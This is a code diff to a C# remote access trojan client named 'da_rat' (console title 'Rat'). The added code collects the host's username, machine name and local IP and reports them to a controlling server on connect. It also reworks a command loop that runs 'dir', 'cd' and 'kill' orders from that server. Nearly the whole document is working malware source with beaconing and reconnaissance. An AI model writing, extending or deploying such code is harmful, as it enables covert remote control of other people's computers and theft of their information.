@@ -21,8 +21,16 @@ namespace da_rat
         private static Socket _clientSocket =
             new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
-        private static Box.Nav ToolBox = new Box.Nav();
-        
+        private static Box ToolBox = new Box();
+
+
+        private static void puts(string text)
+        {
+            Console.WriteLine(text);
+            Console.Write("> ");
+        }
+
+
         static void Main(string[] args)
         {
             Console.Title = "Rat";
@@ -52,12 +60,14 @@ namespace da_rat
                 Console.WriteLine("Socket connected to {0}",
                     client.RemoteEndPoint.ToString());
 
+                SendMessage(GetSysInfo());
+
                 client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), client);
 
                 _connectDone.Set();
             } catch (Exception)
             {
-                System.Console.WriteLine("\n\nRetrying to connect...");
+                puts("\n\nRetrying to connect...");
                 Thread.Sleep(TimeSpan.FromSeconds(1));
             }
         }
@@ -76,29 +86,54 @@ namespace da_rat
 
 
                 string text = Encoding.ASCII.GetString(dataBuf);
-                if (text == "kill") Environment.Exit(0);
-
-                string[] textArr = text.Split();
-                if  (textArr[0] == "dir")           response = ToolBox.Dir();
-                else if (textArr[0] == "cd")
-                    if (!ToolBox.Cd(textArr[1]))    response = "Invalid dir given...";
-
-                if (!String.IsNullOrWhiteSpace(response))
+                if (text == "kill")
                 {
-                    byte[] data = Encoding.ASCII.GetBytes(response);
-                    socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
+                    Console.WriteLine("Received `kill` command from home.");
+                    Environment.Exit(0);
                 }
 
 
-                socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
+                string[] textArr = text.Split();
+                if  (textArr[0] == "dir")
+                    response = ToolBox.Dir();
+                else if (textArr[0] == "cd")
+                    if (!ToolBox.Cd(textArr[1]))    response = "Invalid dir given...";
+
+                SendMessage(response);
             }
-            catch (SocketException) { Console.WriteLine("Server disconnected..."); }
+            catch (SocketException) { puts("Server disconnected..."); }
         }
 
         private static void SendCallback(IAsyncResult AR)
         {
             Socket socket = (Socket)AR.AsyncState;
             socket.EndSend(AR);
+        }
+
+        private static void SendMessage(string message)
+        {
+            byte[] buffer = Encoding.ASCII.GetBytes(message);
+            _clientSocket.Send(buffer);
+
+            _clientSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
+                new AsyncCallback(ReceiveCallback), _clientSocket);
+        }
+
+        private static string GetSysInfo()
+        {
+            string localIp = String.Empty;
+
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                    localIp = ip.ToString();
+            }
+            if (String.IsNullOrEmpty(localIp)) localIp = "NoAddrFound";
+
+            /*> INFO user@machine localIp */
+            return "INFO " + System.Environment.UserName + "@" +
+                System.Environment.MachineName + " " + localIp;
         }
 
         private static void SendLoop()
@@ -111,11 +146,7 @@ namespace da_rat
                 if (req == "break" || req == "exit")
                     break;
 
-                byte[] buffer = Encoding.ASCII.GetBytes(req);
-                _clientSocket.Send(buffer);
-
-                _clientSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
-                    new AsyncCallback(ReceiveCallback), _clientSocket);
+                SendMessage(req);
             }
         }
     }
